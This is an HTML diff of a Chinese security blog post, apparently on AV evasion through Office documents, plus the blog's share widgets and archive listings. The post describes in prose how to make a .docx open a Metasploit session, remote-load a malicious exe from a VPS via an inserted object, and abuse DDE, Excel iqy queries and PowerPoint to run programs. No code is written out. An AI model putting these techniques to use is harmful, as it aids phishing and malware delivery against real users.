+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621151648273.png" alt="image-20220621151648273"></p>
+<p>重新将解压缩出来的东西弄成rar文件，接下来改成docx文档，打开就会发现msf已经上线</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621152600812.png" alt="image-20220621152600812"></p>
+<p>并且远程加载，一般是扫描不出来的</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621152727480.png" alt="image-20220621152727480"></p>
+<h3 id="案例2：-1"><a href="#案例2：-1" class="headerlink" title="案例2："></a>案例2：</h3><p>除了以上加载，我们还可以使用文件形式的加载远程加载。</p>
+<p>在word里面，插入对象，对象里面还有一个由文件创建，可以直接在这里键入远程http</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621153845953.png" alt="image-20220621153845953"></p>
+<p>可以把恶意exe放在vps上，通过这个访问。</p>
+<h2 id="dde"><a href="#dde" class="headerlink" title="dde"></a>dde</h2><p>office中可以使用域来执行一些恶意操作。</p>
+<p><a href=http://www.360doc.com/content/21/0421/16/48115167_973435079.shtml>dde攻击</a></p>
+<p>除了office，excel也可以使用iyq，远程加载网页，做成恶意攻击。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621160201490.png" alt="image-20220621160201490"></p>
+<p><a target="_blank" rel="noopener" href="http://www.ty2y.com/study/exceldiyqdy.html">iyq攻击</a></p>
+<p>PowerPoint中也可以直接加载运行程序。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220621160439809.png" alt="image-20220621160439809"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -183,298 +286,105 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://example.com/2022/06/20/%E6%96%87%E6%9C%AC%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%85%8D%E6%9D%80/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/03/09/%E6%B5%85%E8%B0%88UAC%E5%8F%8A%E7%BB%95%E8%BF%87/" class="archive-article-date">
-  	<time datetime="2022-03-09T13:19:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-09</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2022/06/18/cos%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BC%96%E5%86%99/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">cos远程加载器编写</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/03/09/%E6%B5%85%E8%B0%88UAC%E5%8F%8A%E7%BB%95%E8%BF%87/">浅谈UAC及绕过</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/03/06/%E5%9F%9F%E6%9E%97%E6%B8%97%E9%80%8F/" class="archive-article-date">
-  	<time datetime="2022-03-06T09:10:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-06</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/03/06/%E5%9F%9F%E6%9E%97%E6%B8%97%E9%80%8F/">域林渗透</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/03/06/%E5%9F%9F%E6%B8%97%E9%80%8F-pth%E4%B8%8E%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" class="archive-article-date">
-  	<time datetime="2022-03-06T07:20:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-06</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/03/06/%E5%9F%9F%E6%B8%97%E9%80%8F-pth%E4%B8%8E%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">域渗透--pth与委派攻击</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/03/03/elitecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="archive-article-date">
-  	<time datetime="2022-03-03T11:09:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-03</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/03/03/elitecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">elitecms代码审计</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/02/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" class="archive-article-date">
-  	<time datetime="2022-02-28T08:06:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-28</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/02/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/">内网渗透工具</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/02/27/Kerberos%E5%8D%8F%E8%AE%AE/" class="archive-article-date">
-  	<time datetime="2022-02-27T13:53:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-27</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/02/27/Kerberos%E5%8D%8F%E8%AE%AE/">Kerberos协议</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/02/25/Raven2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" class="archive-article-date">
-  	<time datetime="2022-02-25T02:30:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-25</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/02/25/Raven2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">Raven2靶机渗透</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/02/24/Liunx%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" class="archive-article-date">
-  	<time datetime="2022-02-24T01:00:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-24</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/02/24/Liunx%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">Liunx提权总结</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/02/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" class="archive-article-date">
-  	<time datetime="2022-02-21T08:12:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/02/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">内网穿透</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/2022/">&amp;laquo; Prev</a><a class="page-number" href="/archives/2022/">1</a><span class="page-number current">2</span><a class="page-number" href="/archives/2022/page/3/">3</a><a class="extend next" rel="next" href="/archives/2022/page/3/">Next &amp;raquo;</a>
-    </nav>
   
 
 
@@ -498,8 +408,8 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
